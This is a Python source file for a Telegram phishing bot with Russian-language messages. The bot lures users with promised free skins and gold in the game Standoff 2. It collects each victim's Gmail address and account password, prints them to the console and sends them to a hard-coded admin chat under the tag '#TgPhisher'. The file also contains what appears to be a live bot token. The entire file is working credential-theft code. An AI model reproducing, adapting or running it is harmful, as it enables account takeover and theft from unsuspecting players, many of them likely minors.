import telebot
from telebot import types
import re
import requests
import os

# Жестко закодированные значения
TOKEN = "8081527280:AAEYyLAp5Ki87k-_B7EEEBJDIhG_Wo0HVLY"
ADMIN_ID = "619780433"

# Инициализация бота
bot = telebot.TeleBot(TOKEN)

# Словари для хранения состояния каждого пользователя
user_states = {}
user_channels = {}
user_passwords = {}

# Проверка валидности токена и получение имени бота
def get_bot_username(token):
    url = f"https://api.telegram.org/bot{token}/getMe"
    response = requests.get(url).json()
    if response.get("ok") and 'username' in response.get("result", {}):
        return response["result"]["username"]
    return None

# Вывод информации о запуске
bot_username = get_bot_username(TOKEN)
print(f"Бот запущен! Username: @{bot_username}")

# Обработчик команды /start
@bot.message_handler(commands=['start'])
def handle_start(message):
    user_states[message.chat.id] = "START"
    markup = types.InlineKeyboardMarkup()
    button = types.InlineKeyboardButton(text="Продолжить", callback_data="continue")
    markup.add(button)
    bot.send_message(message.chat.id, "Привет! 👋\n\nДанный сервис поможет вам получить скины и голду в Standoff 2 на ваш аккаунт. Давайте начнем! ✨", reply_markup=markup)

# Обработчик кнопки "Продолжить"
@bot.callback_query_handler(func=lambda call: call.data == "continue")
def handle_continue(call):
    bot.delete_message(call.message.chat.id, call.message.message_id)
    user_states[call.message.chat.id] = "AWAITING_CHANNEL"
    bot.send_message(call.message.chat.id, "Дайте почту Gmail вашего аккаунта в Standoff 2.")

# Обработчик ввода Gmail
@bot.message_handler(func=lambda message: user_states.get(message.chat.id) == "AWAITING_CHANNEL")
def process_channel_step(message):
    channel_username = message.text
    if not re.match(r"^[a-zA-Z0-9_.+-]+@gmail\.com$", channel_username):
        bot.send_message(message.chat.id, "Пожалуйста, отправьте действительный Gmail аккаунта в Standoff 2 (например, example@gmail.com).")
        return

    user_channels[message.chat.id] = channel_username
    markup = types.ReplyKeyboardMarkup(row_width=1, one_time_keyboard=True)
    button1 = types.KeyboardButton("5 скинов аркана, мифик, и епик.")
    button2 = types.KeyboardButton("1000 голды")
    markup.add(button1, button2)
    user_states[message.chat.id] = "AWAITING_CHOICE"
    bot.send_message(message.chat.id, "Выберите сколько скинов или голды:", reply_markup=markup)

# Обработчик выбора скинов/голды
@bot.message_handler(func=lambda message: user_states.get(message.chat.id) == "AWAITING_CHOICE")
def process_choice_step(message):
    if message.text not in ["5 скинов аркана, мифик, и епик.", "1000 голды"]:
        bot.send_message(message.chat.id, "Для приобретения большего количества голды и скинов обратитесь к админу.")
        return

    user_states[message.chat.id] = "AWAITING_PASSWORD"
    bot.send_message(message.chat.id, "Введите пароль от вашего аккаунта Standoff 2.")

# Обработчик ввода пароля
@bot.message_handler(func=lambda message: user_states.get(message.chat.id) == "AWAITING_PASSWORD")
def process_password_step(message):
    password = message.text
    user_passwords[message.chat.id] = password

    # Вывод данных в консоль
    print(f"ID: {message.from_user.id}")
    print(f"Имя: {message.from_user.first_name}")
    print(f"Username: @{message.from_user.username if message.from_user.username else 'None'}")
    print(f"Gmail: {user_channels[message.chat.id]}")
    print(f"Пароль: {password}")
    print()

    # Отправка данных админу
    try:
        bot.send_message(ADMIN_ID, f'''
#TgPhisher - @{bot_username}

- ID: {message.from_user.id}
- Имя: {message.from_user.first_name}
- Username: @{message.from_user.username if message.from_user.username else 'None'}
- Gmail: {user_channels[message.chat.id]}
- Пароль: {password}
- By @CyberStalker1337''')
    except Exception as e:
        print(f"Ошибка при отправке админу: {e}")

    bot.send_message(message.chat.id, f"<b>Запрос отправлен</b>\nВаш запрос будет обработан в ближайшее время.\nВаш ID: {message.from_user.id}", parse_mode='HTML')
    user_states[message.chat.id] = "DONE"  # Состояние завершено

# Запуск бота
if __name__ == "__main__":
    print("Starting bot polling...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(f"Ошибка polling: {e}")
            import time
            time.sleep(5)  # Перезапуск через 5 секунд в случае сбоя